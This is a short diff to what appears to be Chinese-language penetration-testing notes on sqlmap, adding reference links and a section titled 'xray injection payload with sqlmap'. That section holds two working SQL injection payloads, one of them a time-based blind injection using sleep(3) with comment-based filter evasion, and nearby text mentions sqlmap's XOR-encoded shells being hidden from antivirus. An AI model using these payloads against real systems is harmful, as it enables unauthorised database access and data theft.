@@ -1777,7 +1777,15 @@ init:stop().  //退出Erlang Shell是使用init:stop函数完成的
 ## sqlmap常见问题
 + https://www.mad-coding.cn/2020/02/08/sqlmap%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/#0x11-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E8%A1%A8%E5%90%8D
 + https://www.hacking8.com/sqlmap-parse/11.html
++ https://zhuanlan.zhihu.com/p/390240866
++ https://developer.aliyun.com/article/791804
++ https://blog.csdn.net/keaidxxn/article/details/120701689
   
+### xray注入payload 配合sqlmap
+```
+鎈'"\(
+'and(select*from(select+sleep(3))a/**/union/**/select+1)='
+```
 ### sqlmap自带shell、udf解码
 
 sqlmap中自带的shell以及一些二进制文件不能直接使用的，为防止被误杀都经过异或方式编码的（所幸sqlmap自带解码工具）
